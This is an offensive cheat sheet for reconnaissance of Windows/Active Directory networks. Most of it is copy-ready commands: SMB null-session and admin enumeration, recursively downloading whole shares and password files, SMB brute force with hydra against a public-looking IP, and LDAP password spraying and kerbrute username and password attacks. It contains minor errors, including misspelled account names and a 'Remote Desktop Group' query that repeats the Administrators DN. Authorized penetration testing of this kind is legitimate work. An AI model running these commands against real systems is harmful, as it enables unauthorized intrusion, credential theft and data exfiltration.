# External Recon

## SMB

#### Ports: 137 \(UDP\), 139, 445.

### Basic SMB enumeration

```bash
#Enum4linux
enum4linux -a 10.10.10.19 #Without User
enum4linux -a 10.10.10.19 -u Administrator -p Pass123 #Having user

#Rpcclient
rpcclient -U "" -N 10.10.10.19 #No creds
rpcclient -U Administrator 10.10.10.19 #Asks for password
rpcclient -U Administrator --pw-nt-hash 10.10.10.19 #Asks for NTLM hash

#Nmap
nmap --script smb-enum-users.nse -p139,445 -Pn 10.10.10.19 #Enum SMB users
nmap --script smb-enum-shares.nse -p139,445 -Pn 10.10.10.19 #Enum SMB shares 
```

### List shared folders

```bash
#Smbclient
smbclient --no-pass -L //10.10.10.19 # Null user
smbclient -U Administrator -L [--pw-nt-hash] //10.10.10.19 #With --pw-nt-hash, the pwd provided is the NTLM hash

#Smbmap
smbmap -u "Administrator" -p "Pass123" -H 10.10.10.19 #Also works with NTLM hash

#Crackmapexec
crackmapexec smb 10.10.10.19 -u '' -p '' --shares #Null user
crackmapexec smb 10.10.10.19 -u 'Adminisatrator' -p 'Pass123' --shares
```

### Connect/mount shared folders

```bash
#Connect
smbclient -U Administrator [--pw-nt-hash] //10.10.10.19 #With --pw-nt-hash, the pwd provided is the NTLM hash

#Mount
mount -t cifs -o username=user,password=password //10.10.10.19/share /mnt/share
```

### Download files from shared folders

```bash
#Smbmap
smbmap -R Folder -H 10.10.10.19 -A "passwords.txt" -q #Search file in recursive mode and download it

#Smbget
smbget smb://10.10.10.19/Disk$ -R -U "Administrador" #Download all files recursively

#Smbclient
smbclient //10.10.10.19/Disk$
> mask ""
> recurse
> prompt
> mget * #Download everything to current directory
```

### Bruteforce on SMB

```bash
#Hydra
hydra -L users.txt -P password.txt 178.255.196.56 smb -V -t 100

#Smbrute (https://github.com/m4ll0k/SMBrute)
python3 smbrute.py -h 10.10.10.19 -U users.txt -P passwords.txt
```

## LDAP

#### Ports: 389, 636 \(SSL\), 3268, 3269 \(SSL\).

### Basic LDAP enumeration

```bash
#Windapsearch (https://github.com/ropnop/windapsearch)
python windapsearch.py -u Administrator -p Pass123 -d dev.corp --dc-ip 10.10.10.19

#Ad-ldap-enum (https://github.com/CroweCybersecurity/ad-ldap-enum)
python ad-ldap-enum.py -d dev.corp -l 10.10.10.19 -u Administrator -p Pass123
```

### Bruteforce on LDAP

```bash
#Password spray (https://github.com/dafthack/DomainPasswordSpray)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

#Kerbrute (https://github.com/ropnop/kerbrute)
./kerbrute_linux_amd64 bruteuser -d evil.corp --dc 10.10.10.19 rockyou.txt Administrator #Password brute
./kerbrute_linux_amd64 userenum -d evil.corp --dc 10.10.10.19 users.txt #Username brute
./kerbrute_linux_amd64 passwordspray -d evil.corp --dc 10.10.10.19 users.txt rockyou.txt #Password spray
```

### ldapsearch

```bash
#Add one of the following options depending on what you want to do
ldapsearch -x -h 10.10.10.19 -D 'dev.corp\Administrator' -w 'Pass123' <OPTION>

#Extract Users
-b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Computers
-b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract My info
-b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Domain Admins
-b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Domain Users
-b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Enterprise Admins
-b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Administrators
-b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Remote Desktop Group
-b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>"
```

